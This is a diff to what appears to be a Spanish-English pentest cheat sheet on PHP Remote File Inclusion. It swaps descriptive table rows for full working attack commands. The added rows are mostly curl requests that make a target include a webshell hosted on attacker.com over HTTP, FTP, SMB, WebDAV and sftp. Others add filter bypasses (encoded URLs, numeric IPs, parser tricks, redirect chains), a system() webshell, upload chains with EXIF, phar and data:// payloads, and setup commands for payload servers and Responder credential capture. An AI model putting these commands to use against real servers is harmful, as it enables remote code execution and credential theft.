@@ -24,24 +24,25 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| HTTP basic | `?page=http://attacker.com/shell.php` | Standard. |
-| HTTPS | `?page=https://attacker.com/shell.php` | TLS — bypass HTTP filters / IDS. |
-| Custom port | `?page=http://attacker.com:8080/shell.php` | Non-standard ports. |
-| With path | `?page=http://attacker.com/dir/shell.php` | Subdirectory. |
-| With query string | `?page=http://attacker.com/shell.php?cmd=id` | Pass args to shell. |
-| `.txt` extension | `?page=http://attacker.com/shell.txt` | Sometimes server still includes con .txt. |
-| Different filename | Avoid `.php` if filtered | Bypass. |
-| Polyglot file | File con multiple format magic bytes | Combine. |
-| Server-controlled response | Atacante's server serves PHP based on User-Agent | Conditional payload. |
-| Force MIME type | Atacante sets `Content-Type: application/x-php` | Edge. |
-| HTTP redirect chain | URL redirects a final payload | Open Redirect chain. |
-| Custom Host header | `?page=http://attacker.com:80/shell.php` | Standard. |
+| `curl 'https://target/?page=http://attacker.com/shell.php&c=id'` | HTTP RFI standard RCE | Standard RFI. |
+| `curl 'https://target/?page=https://attacker.com/shell.php&c=id'` | HTTPS RFI bypass HTTP IDS | TLS-aware. |
+| `curl 'https://target/?page=http://attacker.com:8080/shell.php&c=id'` | Non-standard port RFI | Custom port. |
+| `curl 'https://target/?page=http://attacker.com/dir/shell.php&c=id'` | Subdirectory RFI | Subdir. |
+| `curl 'https://target/?page=http://attacker.com/shell.php?cmd=whoami'` | Query string passed-thru | Cmd via query. |
+| `curl 'https://target/?page=http://attacker.com/shell.txt&c=id'` | `.txt` extension included as PHP | Extension flexibility. |
+| `curl 'https://target/?page=http://attacker.com/payload&c=id'` | Sin extension included | App lacks extension check. |
+| `curl 'https://target/?page=http://attacker.com/redirect.php'` (redirects → final payload) | Open Redirect chain RFI | Redirect chain. |
+| `curl 'https://target/?page=http://attacker.com/poly.gif&c=id'` (polyglot GIF+PHP) | Polyglot magic-byte file | Polyglot. |
+| `python3 -m http.server 80 --bind 0.0.0.0` (en attacker.com) then `curl https://target/?page=http://attacker.com/shell.php` | Quick HTTP server payload host | Standard host. |
+| `curl -A 'PHP/8.0' 'https://target/?page=http://attacker.com/conditional.php'` | Server serves payload by User-Agent | Conditional payload. |
+| `for url in 'http://attacker.com/sh.php' 'https://attacker.com/sh.php' 'http://attacker.com:8080/sh.php'; do echo "[+] $url"; curl "https://target/?page=$url&c=id"; done` | Iterate scheme variants probe | Schemes probe. |
+| `curl 'https://target/?page=http://attacker.com/shell.php?'` (trailing `?` discards appended ext) | Trailing `?` to discard appended `.php` | Append-ext bypass. |
+| `curl 'https://target/?page=http://attacker.com/shell.php%23'` (URL-encoded `#`) | Trailing `#` fragment ignore | Fragment bypass. |
 ^rfi-vector-http
 
 ### Setup atacante HTTP server
 
 ```bash
-# Atacante hostea webshell
 mkdir /tmp/rfi
 cat > /tmp/rfi/shell.php <<'EOF'
 <?php
@@ -51,12 +52,9 @@ if(isset($_GET['c'])) {
 ?>
 EOF
 
-# Quick HTTP server
 cd /tmp/rfi && python3 -m http.server 80
-
 # Victim:
-# https://target/index.php?page=http://attacker.com/shell.php&c=id
-# Response includes: uid=33(www-data) ...
+# curl 'https://target/index.php?page=http://attacker.com/shell.php&c=id'
 ```
 
 ___
@@ -65,17 +63,18 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| FTP anonymous | `?page=ftp://attacker.com/shell.php` | Anonymous read. |
-| FTP authenticated | `?page=ftp://user:pass@attacker.com/shell.php` | Userinfo en URL. |
-| FTP active vs passive | Per-server config | Edge. |
-| SMB / CIFS | `?page=\\\\attacker.com\\share\\shell.php` | Windows SMB. |
-| `smb://` scheme | `?page=smb://attacker.com/share/shell.php` | Linux SMB protocol. |
-| `cifs://` | Same family | Edge. |
-| SMB null session | If server allows | Anonymous SMB. |
-| WebDAV | `?page=http://attacker.com/dav/shell.php` | If WebDAV available. |
-| Combine con SMB relay | If victim PHP server bypasses corp firewall | Edge. |
-| FTP active mode con NAT | May fail through NAT | Per-network. |
-| sftp:// (PHP ssh2 ext) | If SSH2 extension installed | Edge. |
+| `curl 'https://target/?page=ftp://attacker.com/shell.php&c=id'` | FTP anonymous RFI | FTP allow_url_fopen. |
+| `curl 'https://target/?page=ftp://anon:x@attacker.com/shell.php&c=id'` | FTP anonymous explicit | Anon. |
+| `curl 'https://target/?page=ftp://user:pass@attacker.com/shell.php&c=id'` | FTP authenticated userinfo URL | Auth. |
+| `curl 'https://target/?page=\\\\attacker.com\\share\\shell.php&c=id'` | UNC SMB Windows | Windows SMB. |
+| `curl 'https://target/?page=smb://attacker.com/share/shell.php&c=id'` | Linux smb:// scheme | Linux SMB. |
+| `curl 'https://target/?page=cifs://attacker.com/share/shell.php&c=id'` | CIFS scheme variant | Edge. |
+| `python3 -m pyftpdlib -p 21 -d /tmp/rfi --read-permit=elradfmw --write-permit=elradfmw` (anon FTP server) | Quick anon FTP server payload host | Setup. |
+| `impacket-smbserver share /tmp/rfi -smb2support` (anon SMB) | Quick SMB anon share | Setup SMB. |
+| `curl 'https://target/?page=sftp://attacker.com/shell.php&c=id'` (PHP ssh2 ext) | sftp:// scheme RFI | PHP ssh2 ext. |
+| `curl 'https://target/?page=http://attacker.com/dav/shell.php&c=id'` (WebDAV) | WebDAV-hosted payload | WebDAV. |
+| `cadaver http://attacker.com/dav/` (setup WebDAV) | Setup WebDAV server | Setup. |
+| `responder -I eth0 -wrf` (capture credentials via SMB) | Responder SMB capture victim creds | Adjacent SMB. |
 ^rfi-vector-ftp
 
 ___
@@ -84,19 +83,20 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Direct URL | `?page=http://attacker.com/x` | Standard. |
-| URL sin extension | `?page=http://attacker.com/raw` | If server appends `.php`. |
-| URL with `?` to terminate | `?page=http://attacker.com/x?` | App's `.php` becomes query. |
-| URL with `#` fragment | `?page=http://attacker.com/x#` | Fragment ignored server-side. |
-| URL with `&` | Combine query trick | Edge. |
-| Encoded URL | `?page=http%3A%2F%2Fattacker.com%2Fx` | URL-encoded. |
-| Doble encoded | `?page=http%253A%252F%252Fattacker.com` | Multi-decode. |
-| IP-based URL | `?page=http://12345/x` (numeric IP) | Bypass DNS filter. |
-| IPv6 URL | `?page=http://[2001:db8::1]/x` | IPv6 attacker. |
-| Custom protocol | App-specific scheme | Edge. |
-| URL con userinfo trick | `?page=http://target.com@attacker.com/x` | Parser confusion. |
-| Combine con DNS rebinding | TOCTOU DNS | Edge. |
-| Combine con Open Redirect | Chain through legit redirect | Standard. |
+| `curl 'https://target/?page=http://attacker.com/raw&c=id'` | URL sin extension | App appends `.php`. |
+| `curl 'https://target/?page=http://attacker.com/x?&c=id'` | Trailing `?` terminate appended | App-appended extension dropped. |
+| `curl 'https://target/?page=http://attacker.com/x%23&c=id'` | URL-encoded `#` fragment ignore | Fragment bypass. |
+| `curl 'https://target/?page=http%3A%2F%2Fattacker.com%2Fshell.php&c=id'` | URL-encoded scheme | URL encode. |
+| `curl 'https://target/?page=http%253A%252F%252Fattacker.com%252Fshell.php&c=id'` | Double URL-encoded scheme | Multi-decode. |
+| `curl 'https://target/?page=http://3232235521/shell.php&c=id'` (3232235521 = 192.168.1.1) | Decimal IP URL bypass DNS filter | Decimal IP. |
+| `curl 'https://target/?page=http://0xC0A80101/shell.php&c=id'` | Hex IP URL bypass | Hex IP. |
+| `curl 'https://target/?page=http://[2001:db8::1]/shell.php&c=id'` | IPv6 URL | IPv6 host. |
+| `curl 'https://target/?page=http://target.com@attacker.com/shell.php&c=id'` | URL userinfo parser trick | Parser confusion. |
+| `curl 'https://target/?page=http://attacker.com#@target.com/shell.php&c=id'` | Fragment user trick | URL parser quirk. |
+| `curl 'https://target/?page=https://bit.ly/shorturl&c=id'` (URL shortener) | URL shortener proxy | URL filter bypass. |
+| `curl 'https://target/?page=https://legit-redirect.com/r?url=http://attacker.com/shell.php&c=id'` | Open Redirect chain | Redirect chain. |
+| `dig +short attacker.com` luego use IP directly | Bypass DNS-blocklist with raw IP | IP bypass. |
+| `python3 -c "import socket; print(int.from_bytes(socket.inet_aton('192.168.1.1'),'big'))"` | Calculate decimal IP for bypass | Encode helper. |
 ^rfi-vector-raw
 
 ___
@@ -105,18 +105,17 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Upload PHP en target | Use file upload feature | Standard chain. |
-| Upload `.txt` con PHP code | Bypass extension filter | Standard. |
-| Reference uploaded file via local path | LFI mode | Same as LFI. |
-| Reference uploaded file via remote URL | If atacante's site mirrors target | Edge. |
-| Combine con Subdomain Takeover | Atacante owns subdomain → hosts payload there | Compound. |
-| Polyglot file upload | File con multiple formats | Multi-vector. |
-| Phar polyglot | Phar deserialization combo | Adjacent. |
-| Image with PHP | EXIF metadata con PHP | Stealth. |
-| Force-include .png | If server includes regardless of extension | Standard. |
-| Combine con `data://` | Embed payload directly | Alternative. |
-| Cache poisoning combo | Cache poison + RFI | Mass impact. |
-| Internal upload + external RFI URL | Stage payload internally, fetch externally | Combine. |
+| `curl -F 'file=@shell.php' https://target/upload && curl 'https://target/?page=https://target/uploads/shell.php&c=id'` | Upload + self-host RFI loop | Self-RFI loop. |
+| `echo '<?php system($_GET["c"]); ?>' > shell.txt && curl -F 'file=@shell.txt' https://target/upload && curl 'https://target/?page=https://target/uploads/shell.txt&c=id'` | `.txt` upload + RFI include as PHP | Extension bypass. |
+| `exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg && curl -F 'image=@image.jpg' https://target/upload && curl 'https://target/?page=https://target/uploads/image.jpg&c=id'` | EXIF inject + RFI include | Polyglot. |
+| `curl -F 'file=@shell.php' https://attacker-sub.target.com/upload` (post-takeover) | Subdomain takeover + payload host | Sub-takeover combo. |
+| `python3 -c "import zipfile; z=zipfile.ZipFile('p.zip','w'); z.writestr('shell.php','<?php system(\$_GET[\"c\"]); ?>'); z.close()" && curl -F 'file=@p.zip' https://target/upload && curl 'https://target/?page=phar:///tmp/p.zip/shell.php'` | Phar polyglot upload + trigger | Phar combo. |
+| `curl --data-urlencode 'page=data://text/plain;base64,'$(echo '<?php system("id"); ?>' \| base64 -w0) -G https://target/` | data:// inline payload (sin upload) | data:// alt. |
+| `python3 -m http.server 80` en attacker + `curl 'https://target/?page=http://attacker.com/shell.php&c=id'` | Attacker hosts payload directly | Standard. |
+| `curl -F 'file=@logo.png;filename=../../tmp/sh.png' https://target/upload && curl 'https://target/?page=/tmp/sh.png&c=id'` | Path traversal upload + LFI variant | LFI hybrid. |
+| `curl -F 'file=@payload.phar' https://target/upload && curl 'https://target/?page=phar:///var/www/uploads/payload.phar/x'` | Phar deserialization trigger post-upload | Phar-deser combo. |
+| `for sub in www app api admin; do curl -F 'file=@shell.php' "https://$sub.target.com/upload" 2>&1 \| head -1; done` | Multi-subdomain upload probe | Sub probe. |
+| Burp Repeater intercept upload → modify filename → forward | Manual upload chain | Workflow. |
 ^rfi-vector-local-upload
 
 ***
